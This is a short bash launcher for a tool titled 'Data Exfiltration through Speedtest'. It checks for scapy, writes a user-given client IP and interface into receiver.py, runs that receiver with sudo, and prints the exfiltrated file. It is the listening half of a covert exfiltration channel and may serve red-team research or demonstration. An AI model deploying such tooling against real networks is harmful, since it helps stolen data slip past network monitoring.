#!/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BOLD='\033[1m'
DIM='\033[2m'
ITALIC='\033[3m'
SPEEDTEST_PURPLE='\033[38;2;139;92;246m'
NC='\033[0m'

echo -e "${BOLD}${SPEEDTEST_PURPLE}╔════════════════════════════════════════╗${NC}"
echo -e "${BOLD}${SPEEDTEST_PURPLE}║  Data Exfiltration through Speedtest   ║${NC}"
echo -e "${BOLD}${SPEEDTEST_PURPLE}║  ${DIM}${ITALIC}Author: Janessa Palmieri${NC}${BOLD}${SPEEDTEST_PURPLE}              ║${NC}"
echo -e "${BOLD}${SPEEDTEST_PURPLE}╚════════════════════════════════════════╝${NC}"

trap 'echo -e "\n${RED}Error: something went wrong. Exiting.${NC}" >&2; exit 1' ERR
set -e

# Check dependencies
echo -e "\n${YELLOW}Checking dependencies...${NC}"

deps_ok=true
command -v python3 &>/dev/null || { echo -e "${RED}Missing: python3${NC}"; deps_ok=false; }
python3 -c "import scapy" 2>/dev/null || { echo -e "${RED}Missing: scapy (pip install scapy)${NC}"; deps_ok=false; }

if [ "$deps_ok" = false ]; then
    echo -e "${RED}Please install missing dependencies and try again.${NC}"
    exit 1
fi

echo -e "${GREEN}All dependencies found.${NC}\n"

# Get input
read -p "Enter client IP (e.g. 192.168.1.10): " client_ip
read -p "Enter network interface (e.g. ens18): " iface

# Update receiver.py
sed -i "s|src host [0-9.]*|src host $client_ip|" receiver.py
sed -i "s|iface=\"[^\"]*\"|iface=\"$iface\"|" receiver.py

echo -e "\n${YELLOW}Starting receiver on $iface filtering for $client_ip...${NC}"
echo -e "${YELLOW}Waiting for exfiltrated data...${NC}\n"

sudo python3 receiver.py

echo -e "\n${BOLD}${SPEEDTEST_PURPLE}Exfiled file contents:${NC}"
cat exfil_file.txt
